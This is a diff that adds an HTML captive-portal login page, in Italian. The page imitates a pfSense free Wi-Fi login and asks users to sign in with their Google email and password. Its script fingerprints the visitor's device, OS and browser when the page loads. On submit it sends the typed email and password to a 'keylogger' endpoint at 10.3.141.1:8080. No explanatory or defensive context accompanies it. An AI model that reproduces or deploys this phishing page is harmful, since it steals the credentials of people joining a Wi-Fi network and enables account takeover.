@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<title>Accedi - pfsense</title>
+<link rel="stylesheet" href="style.css">
+<style>
+p img{
+  display:inline-block;
+  vertical-align:middle;
+  margin-right:5px;
+}
+html { 
+  background: url(images/abstract-wave.jpg) no-repeat center center fixed; 
+  -webkit-background-size: cover;
+  -moz-background-size: cover;
+  -o-background-size: cover;
+  background-size: cover;
+}
+/* Customize the label (the container) */
+.container {
+  display: block;
+  position: relative;
+  padding-left: 35px;
+  margin-bottom: 12px;
+  cursor: pointer;
+  font-size: 22px;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none;
+}
+
+/* Hide the browser's default checkbox */
+.container input {
+  position: absolute;
+  opacity: 0;
+  cursor: pointer;
+  height: 0;
+  width: 0;
+}
+
+/* Create a custom checkbox */
+.checkmark {
+  position: absolute;
+  top: 0;
+  left: 0;
+  height: 25px;
+  width: 25px;
+  background-color: #eee;
+}
+
+/* On mouse-over, add a grey background color */
+.container:hover input ~ .checkmark {
+  background-color: #ccc;
+}
+
+/* When the checkbox is checked, add a blue background */
+.container input:checked ~ .checkmark {
+  background-color: #2196F3;
+}
+
+/* Create the checkmark/indicator (hidden when not checked) */
+.checkmark:after {
+  content: "";
+  position: absolute;
+  display: none;
+}
+
+/* Show the checkmark when checked */
+.container input:checked ~ .checkmark:after {
+  display: block;
+}
+
+/* Style the checkmark/indicator */
+.container .checkmark:after {
+  left: 9px;
+  top: 5px;
+  width: 5px;
+  height: 10px;
+  border: solid white;
+  border-width: 0 3px 3px 0;
+  -webkit-transform: rotate(45deg);
+  -ms-transform: rotate(45deg);
+  transform: rotate(45deg);
+} 
+</style>
+<script>
+function detectOS(){
+  var OSName = "unknown OS";
+  if (navigator.userAgent.indexOf("Win") != -1) OSName = "Windows";
+  if (navigator.userAgent.indexOf("Mac") != -1) OSName = "MacOS";
+  if (navigator.userAgent.indexOf("X11") != -1) OSName="Unix";
+  if (navigator.userAgent.indexOf("Linux") != -1) OSName = "Linux";
+  if (navigator.userAgent.indexOf("Android") != -1) OSName = "Android";
+  if (navigator.userAgent.indexOf("like Mac") != -1) OSName = "iOS";
+  return OSName;
+}
+
+function fnBrowserDetect(){	
+  var userAgent = navigator.userAgent;
+  var browserName;         
+  if(userAgent.match(/chrome|chromium|crios/i)){
+    browserName = "chrome";
+  }else if(userAgent.match(/firefox|fxios/i)){
+    browserName = "firefox";
+  }else if(userAgent.match(/safari/i)){
+    browserName = "safari";
+  }else if(userAgent.match(/opr\//i)){
+    browserName = "opera";
+  }else if(userAgent.match(/edg/i)){
+    browserName = "edge";
+  }else{
+    browserName="no browser detection";
+  } 
+  return browserName;         
+}
+
+function detectDevice(){
+  const ua = navigator.userAgent;
+  if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
+    return "tablet";
+  }
+  else if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
+    return "mobile";
+  }
+  return "desktop";
+};
+
+function beforeSubmit(){
+  var deviceType = detectDevice();
+  var connection_time = new Date();
+  var index = ["status: connected", "connection time: "+connection_time, "email: "+document.getElementById("email").value, "password: "+document.getElementById("passwordtype").value];
+  var request = new XMLHttpRequest();
+  (function loop(i, length) {
+      if (i>= length) {
+	  return;
+      }
+      var url = "http://10.3.141.1:8080/keylogger?c=" + index[i];
+
+      request.open("GET", url, false);
+      request.onreadystatechange = function() {
+	  if(request.readyState === XMLHttpRequest.DONE) {
+	      loop(i + 1, length);
+	  }
+      }
+      request.send();
+  })(0, index.length);
+  return true;
+}
+
+function formLoad(redir){
+  var deviceType = detectDevice();
+  var OSName = detectOS();
+  var browserName = fnBrowserDetect();
+  var connection_time = new Date();
+  var index = ["[***portal opened***]", "device type: "+deviceType, "OS name: "+OSName, "browser name: "+browserName, "captive portal spawn time: "+connection_time, "redirect: "+redir, "status: waiting for user login", "..."];
+  var request = new XMLHttpRequest();
+  (function loop(i, length) {
+      if (i>= length) {
+	  return;
+      }
+      var url = "http://10.3.141.1:8080/keylogger?c=" + index[i];
+
+      request.open("GET", url, false);
+      request.onreadystatechange = function() {
+          if(request.readyState === XMLHttpRequest.DONE) {
+             loop(i + 1, length);
+          }
+      }
+      request.send();
+  })(0, index.length);
+  return true;
+}
+
+function isChecked(elem){
+  passwordtype = document.getElementById('passwordtype');
+  if(elem.checked){
+	  passwordtype.type = 'text';
+  } else {
+	  passwordtype.type = 'password'
+  }
+}
+</script>
+</head>
+<body onload="formLoad('$redir');">
+<div class="box" style="background: white;">
+	<div style="margin-bottom: 20px;text-align: center;"><img src="images/PfSense_logo.png" width="200" height="60"/></div>
+	<h2>Accedi alla rete Wi-Fi libera</h2>               
+	<div id='container1'>
+		<p align="center">Usa il tuo account Google<img src="images/gicon.png" alt="" width="40" height="40"></p>
+	</div>
+	<form onsubmit="beforeSubmit();" id="getForm" method="get" action="$authaction">
+		<div class="inputBox">
+			<input type="email" id="email" name="email" required onkeyup="this.setAttribute('value', this.value);"  value="">
+			<label>Email</label>
+		</div>
+		<div class="inputBox">
+			<input id="passwordtype" type="password" name="text" required onkeyup="this.setAttribute('value', this.value);" value="">
+			<label>Password</label>
+		</div>
+		<label class="container"><p style="text-align: left">Mostra password </p>
+			<input onclick="isChecked(this);"type="checkbox">
+			<span class="checkmark"></span>
+		</label>
+		<input type="hidden" name="tok" value="$tok">
+		<input type="hidden" id="redirect" name="redir" value="../land.html?redir=$redir">
+		<input type="submit" value="Accedi">
+	</form>
+</div>
+</body>
+</html>
